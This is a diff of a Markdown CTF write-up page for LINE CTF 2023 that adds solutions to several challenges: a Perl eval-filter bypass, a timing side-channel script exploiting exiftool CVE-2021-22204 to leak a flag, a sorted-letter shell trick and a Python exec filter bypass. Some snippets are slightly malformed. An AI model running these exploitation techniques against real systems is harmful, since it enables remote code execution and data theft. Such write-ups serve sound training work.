@@ -4,6 +4,212 @@ date: "2023-03-25"
 tags: ["CTF", "LINE", "jeopardy"]
 ---
 
+# Web
+
+## oldpal
+
+This challenge featured a web page with a Perl backend that would get a parameter `password`, perform some checks against it, and if it were the correct one, the server would echo out the flag.
+
+The final check we need to pass to get the flag is the following:
+
+```perl
+if (eval("$pw == 20230325")) {
+    print "Congrats! Flag is LINECTF{redacted}"
+} else {
+    print "wrong password :(";
+    die();
+};
+```
+
+Clearly, the `password` should be a string that evaluates to the number "20230325" (or something else that lets us execute some code inside the `eval` to read the flag anyway!).
+
+The `password` would get checked by different regular expression filters. Let's go through them one by one:
+
+```perl
+if (length($pw) >= 20) {
+    print "Too long :(";
+    die();
+}
+```
+
+This filter obviously checks the length of the `password`.
+
+```perl
+if ($pw =~ /[^0-9a-zA-Z_-]/) {
+    print "Illegal character :("
+    die();
+}
+```
+
+This filter allows the `password` to be comprised only of alphanumerical characters, "\_", and "-".
+
+```perl
+if ($pw !~ /[0-9]/ || $pw !~ /[a-zA-Z]/ || $pw !~ /[_-]/) {
+    print "Weak password :(";
+    die();
+}
+```
+
+This filter forces us to use at least a number, a letter, and both "\_" and "-" in the `password`.
+
+```perl
+if ($pw =~ /[0-9_-][boxe]/i) {
+    print "Do not punch me :(";
+    die();
+}
+```
+
+This filter prevents us from using hexadecimal (`0x` prefix), binary (`0b` prefix), octal (`0o` prefix) integer literals, in addition to numbers in scientific notation (of the form `<N>e<E>`).
+
+```perl
+if ($pw =~ /AUTOLOAD|BEGIN|CHECK|DESTROY|END|INIT|UNITCHECK|abs|accept|alarm|atan2|bind|binmode|bless|break|caller|chdir|chmod|chomp|chop|chown|chr|chroot|close|closedir|
+connect|cos|crypt|dbmclose|dbmopen|defined|delete|die|dump|each|endgrent|endhostent|endnetent|endprotoent|endpwent|endservent|eof|eval|exec|exists|exit|fcntl|fileno|flock
+|fork|format|formline|getc|getgrent|getgrgid|getgrnam|gethostbyaddr|gethostbyname|gethostent|getlogin|getnetbyaddr|getnetbyname|getnetent|getpeername|getpgrp|getppid|getp
+riority|getprotobyname|getprotobynumber|getprotoent|getpwent|getpwnam|getpwuid|getservbyname|getservbyport|getservent|getsockname|getsockopt|glob|gmtime|goto|grep|hex|ind
+ex|int|ioctl|join|keys|kill|last|lc|lcfirst|length|link|listen|local|localtime|log|lstat|map|mkdir|msgctl|msgget|msgrcv|msgsnd|my|next|not|oct|open|opendir|ord|our|pack|p
+ipe|pop|pos|print|printf|prototype|push|quotemeta|rand|read|readdir|readline|readlink|readpipe|recv|redo|ref|rename|require|reset|return|reverse|rewinddir|rindex|rmdir|sa
+y|scalar|seek|seekdir|select|semctl|semget|semop|send|setgrent|sethostent|setnetent|setpgrp|setpriority|setprotoent|setpwent|setservent|setsockopt|shift|shmctl|shmget|shm
+read|shmwrite|shutdown|sin|sleep|socket|socketpair|sort|splice|split|sprintf|sqrt|srand|stat|state|study|substr|symlink|syscall|sysopen|sysread|sysseek|system|syswrite|te
+ll|telldir|tie|tied|time|times|truncate|uc|ucfirst|umask|undef|unlink|unpack|unshift|untie|use|utime|values|vec|wait|waitpid|wantarray|warn|write/) {
+    print "I know eval injection :(";
+    die();
+}
+```
+
+This filter prevents us from using names of functions that can be used to trigger abitrary code execution inside the `eval()`.
+
+```perl
+if ($pw =~ /[Mx. squ1ffy]/i) {
+    print "You may have had one too many Old Pal :(";
+    die();
+}
+```
+
+This filter prevents us from using certain characters, including `.`.
+
+The important thing to note is that we can (must, in fact) use "-" in the password: we can use this to perform a subtraction.
+The other character we must use is "\_". I don't know Perl, but this reminded me of the special variables/methods in Python like `__init__`, `__main__` and so on.
+A quick Google search informed me that, in fact, there are similar special variables also in Perl!
+In particular, we can use the `__LINE__` variable, which gets evaluated to the number of the line of code that is currently being executed (inside an `eval` it evaluates to 1).
+
+This allows us to call the server with a `password` that passess all the checks and evaluates to the desired value: `20230326-__LINE__`.
+Sending a request with this string as the `password` parameter gives us the flag:
+`LINECTF{3e05d493c941cfe0dd81b70dbf2d972b}`.
+
+## Imagexif
+
+This challenge featured a ~~simple~~ web server written in `flask` that uses `exiftool` to provide information about an uploaded image. Jinja2 is used to serve HTML pages, but no SSTI there for today. Instead, after poking and reading the code for a while we noticed something in the Dockerfile:
+
+```dockerfile
+FROM python:3.11.2
+
+RUN apt-get update
+
+RUN apt-get install -y curl wget && \
+    DEBIAN_FRONTEND="noninteractive"         && \
+    echo done
+
+RUN wget https://github.com/exiftool/exiftool/archive/refs/tags/12.22.tar.gz && \
+    tar xvf 12.22.tar.gz && \
+    cp -fr /exiftool-12.22/* /usr/bin && \
+    rm -rf /exiftool-12.22 && \
+    rm 12.22.tar.gz
+
+ADD ./src /src/
+ADD ./conf /conf/
+
+WORKDIR /src
+
+COPY uwsgi.ini .
+
+RUN addgroup --gid 1000 appuser && \
+    useradd --uid 1000 --gid 1000 -r -s /bin/false appuser
+
+RUN find /src -type d -exec chmod 755 {} + && \
+    find /src -type f -exec chmod 644 {} + && \
+    find /src -type f -exec chattr +i {} \; && \
+    find /src/tmp -type d -exec chmod 777 {} + && \
+    find /src/*.sh -exec chmod +x {} \;
+
+RUN apt-get install -y tzdata && \
+    cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime && \
+    echo "Asia/Tokyo" > /etc/timezone
+
+RUN python3.11 -m pip install -r requirements.txt
+RUN python3.11 -m pip install uwsgi
+RUN apt-get purge -y curl wget
+
+RUN ln -sf /bin/bash /bin/sh
+
+CMD ["uwsgi", "uwsgi.ini"]
+
+RUN chmod o-x /usr/local/bin/python3.11 && \
+    rm /usr/lib/x86_64-linux-gnu/perl-base/socket.pm
+```
+
+The Dockerfile downloads a slightly outdated version of `exiftool`. From other CTFs, we knew that `exiftool` had some problems in the past, so we looked around for CVEs related to this version. With little surprise, we found that this version is vulnerable to [CVE-2021-22204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204), allowing a quite simple RCE. After quickly getting an PoC exploit from [this repo](https://github.com/UNICORDev/exploit-CVE-2021-22204), we got the flag... or so we thought.
+
+There is a catch: the backend container is completely isolated from external networks, so no reverse shell, curl, or even DNS exfiltration here! We decided to use a side-channel: time (e.g. `sleep`). Fairly enough, we can find a utility script already on the backend that allows to convert a character to its ASCII (decimal) representation. We also knew that flag letters only included hexadecimal digits, making it easier to optimize the side-channel.
+The following is the script used to extract the flag with success. Notice that we could not use some characters (e.g. parenthesis), making the scripting part a little more frustrating. The final script is fairly fast and reliable:
+
+```py
+#!/usr/bin/env python
+
+import os
+import requests
+import time
+
+flag = "LINECTF{"
+#       LINECTF{2a38211e3b4da95326f5ab593d0af0e9}
+i = len(flag)
+while True:
+    print(flag)
+
+    # This command will:
+    #  - save into X the ascii value of the i-th character of the flag
+    #  - sleep for $X - 87 seconds, which may mean not sleeping (if character is in 0-9),
+    #    where 87 is ord('a') - 10, so that characters in a-f will cause a sleep from 10 to 16 seconds
+    #  - if previous sleep failed, sleep for $X - 48 seconds, where 48 is ord('0'), meaning that
+    #    we will sleep from 0 to 9 seconds for characters in 0-9
+    #
+    # TL;DR;
+    #  - 0 <= sleep < 10 -> 0-9
+    #  - 10 <= sleep <= 15 -> a-f
+    cmd = (
+        "X=`/src/ascii.sh ${FLAG:%d:1}`; sleep `expr $X - 87` || sleep `expr $X - 48`"
+        % i
+    )
+    print(cmd)
+
+    # Craft the image using a CVE PoC found online
+    # Download the exploit from here, or do it by hand
+    # https://github.com/UNICORDev/exploit-CVE-2021-22204
+    os.system(f"python ./cve-2021-22204.py -c '{cmd}'")
+
+    # Send a request computing the time. We will use time to exfiltrate a single character
+    # of the flag at a time
+    start = time.time()
+    r = requests.post(
+        "http://34.85.58.100:11008/upload", files={"file": open("./image.jpg", "rb")}
+    )
+    end = time.time()
+    elapsed = end - start
+
+    # Check if we got a match with one of our expected characters.
+    # It may happen that this script fails (finds the wrong letter) due to network latency,
+    # but it did not happen in practice
+    print(f"Elapsed: {elapsed}")
+    try:
+        char = "0123456789abcdef"[int(elapsed)]
+        print(f"Found: {char}")
+        if char in "1234567890abcdef}":
+            flag += char
+    except:
+        flag += "?"
+        print("Rejected!")
+    i += 1
+```
+
 # Reversing
 
 ## Fishing
@@ -115,6 +321,50 @@ for i in range(len(encFlag)):
 
 print("}")
 ```
+
+# Misc
+
+## abhs
+
+This challenge featured a modified version of /bin/sh that, when prompted with a command, would reorder the letters in the name of the command and in each of the arguments so that the resulting characters in each string would be in alphabetical order.
+
+The first command we can issue is `ls`. This shows us that the file `flag.txt` containing the flag is indeed in the current working directory.
+
+We should then find a way to read this file. We can't use `cat`, as we would actually issue the command `act`, and the shell would indeed error out with `sh: act: not found`.
+
+Luckily, `ls /bin` is the letters in each word are reordered, so we can use this command to list all the available commands, then filter them to keep only those that we can actually use.
+We are left with a bunch of standard linux commands. After trying some of them, I noticed a command named `fmt`, which apparently is something we can use to format files.
+We can simply issue the command `fmt *` to get the flag:
+`bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}`
+
+## ez-class
+
+This challenge featured a service that would let us define Python classes.
+The service would let us specify the name of the class, the base class to inherit from, the names, the arguments and the body of the methods we wanted in it.
+It would save the resulting code to a file, exec() it and then instantiate an object of our class.
+
+The first thing to note is that we can easily execute code by putting it inside the constructor of a class, as it gets called when the object is instantiated by the server.
+The only problem is that the service put some restrictions on the characters we could use for the code inside our functions: a function `get_legal_code` would get called that used `input()` to get the code; the function would then throw an error if the code contained the characters "(", ")", "." or "\n".
+
+An easy (and perhaps unintended?) way to solve this challenge is to request a class with the following structure:
+
+```py
+def A:
+    def __init__(self):
+        global get_legal_code; get_legal_code = input
+```
+
+This way, in the following requests, our code won't be checked against the blacklisted characters!
+We can then simply request the following class:
+
+```py
+def B:
+    def __init__(self)
+        print(open("flag.txt", "r").read())
+```
+
+which will print out the flag:
+`bctf{m3ta_c4l1abl3_b5e478f33eb890a2ee65}`
 
 # Pwn
 
@@ -239,120 +489,4 @@ def main():
 if __name__ == "__main__":
     main()
 
-```
-
-# Web
-
-## Imagexif
-
-This challenge featured a ~~simple~~ web server written in `flask` that uses `exiftool` to provide information about an uploaded image. Jinja2 is used to serve HTML pages, but no SSTI there for today. Instead, after poking and reading the code for a while we noticed something in the Dockerfile:
-
-```dockerfile
-FROM python:3.11.2
-
-RUN apt-get update
-
-RUN apt-get install -y curl wget && \
-    DEBIAN_FRONTEND="noninteractive"         && \
-    echo done
-
-RUN wget https://github.com/exiftool/exiftool/archive/refs/tags/12.22.tar.gz && \
-    tar xvf 12.22.tar.gz && \
-    cp -fr /exiftool-12.22/* /usr/bin && \
-    rm -rf /exiftool-12.22 && \
-    rm 12.22.tar.gz
-
-ADD ./src /src/
-ADD ./conf /conf/
-
-WORKDIR /src
-
-COPY uwsgi.ini .
-
-RUN addgroup --gid 1000 appuser && \
-    useradd --uid 1000 --gid 1000 -r -s /bin/false appuser
-
-RUN find /src -type d -exec chmod 755 {} + && \
-    find /src -type f -exec chmod 644 {} + && \
-    find /src -type f -exec chattr +i {} \; && \
-    find /src/tmp -type d -exec chmod 777 {} + && \
-    find /src/*.sh -exec chmod +x {} \;
-
-RUN apt-get install -y tzdata && \
-    cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime && \
-    echo "Asia/Tokyo" > /etc/timezone
-
-RUN python3.11 -m pip install -r requirements.txt
-RUN python3.11 -m pip install uwsgi
-RUN apt-get purge -y curl wget
-
-RUN ln -sf /bin/bash /bin/sh
-
-CMD ["uwsgi", "uwsgi.ini"]
-
-RUN chmod o-x /usr/local/bin/python3.11 && \
-    rm /usr/lib/x86_64-linux-gnu/perl-base/socket.pm
-```
-
-The Dockerfile downloads a slightly outdated version of `exiftool`. From other CTFs, we knew that `exiftool` had some problems in the past, so we looked around for CVEs related to this version. With little surprise, we found that this version is vulnerable to [CVE-2021-22204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204), allowing a quite simple RCE. After quickly getting an PoC exploit from [this repo](https://github.com/UNICORDev/exploit-CVE-2021-22204), we got the flag... or so we thought.
-
-There is a catch: the backend container is completely isolated from external networks, so no reverse shell, curl, or even DNS exfiltration here! We decided to use a side-channel: time (e.g. `sleep`). Fairly enough, we can find a utility script already on the backend that allows to convert a character to its ASCII (decimal) representation. We also knew that flag letters only included hexadecimal digits, making it easier to optimize the side-channel.
-The following is the script used to extract the flag with success. Notice that we could not use some characters (e.g. parenthesis), making the scripting part a little more frustrating. The final script is fairly fast and reliable:
-
-```py
-#!/usr/bin/env python
-
-import os
-import requests
-import time
-
-flag = "LINECTF{"
-#       LINECTF{2a38211e3b4da95326f5ab593d0af0e9}
-i = len(flag)
-while True:
-    print(flag)
-
-    # This command will:
-    #  - save into X the ascii value of the i-th character of the flag
-    #  - sleep for $X - 87 seconds, which may mean not sleeping (if character is in 0-9),
-    #    where 87 is ord('a') - 10, so that characters in a-f will cause a sleep from 10 to 16 seconds
-    #  - if previous sleep failed, sleep for $X - 48 seconds, where 48 is ord('0'), meaning that
-    #    we will sleep from 0 to 9 seconds for characters in 0-9
-    #
-    # TL;DR;
-    #  - 0 <= sleep < 10 -> 0-9
-    #  - 10 <= sleep <= 15 -> a-f
-    cmd = (
-        "X=`/src/ascii.sh ${FLAG:%d:1}`; sleep `expr $X - 87` || sleep `expr $X - 48`"
-        % i
-    )
-    print(cmd)
-
-    # Craft the image using a CVE PoC found online
-    # Download the exploit from here, or do it by hand
-    # https://github.com/UNICORDev/exploit-CVE-2021-22204
-    os.system(f"python ./cve-2021-22204.py -c '{cmd}'")
-
-    # Send a request computing the time. We will use time to exfiltrate a single character
-    # of the flag at a time
-    start = time.time()
-    r = requests.post(
-        "http://34.85.58.100:11008/upload", files={"file": open("./image.jpg", "rb")}
-    )
-    end = time.time()
-    elapsed = end - start
-
-    # Check if we got a match with one of our expected characters.
-    # It may happen that this script fails (finds the wrong letter) due to network latency,
-    # but it did not happen in practice
-    print(f"Elapsed: {elapsed}")
-    try:
-        char = "0123456789abcdef"[int(elapsed)]
-        print(f"Found: {char}")
-        if char in "1234567890abcdef}":
-            flag += char
-    except:
-        flag += "?"
-        print("Rejected!")
-    i += 1
 ```
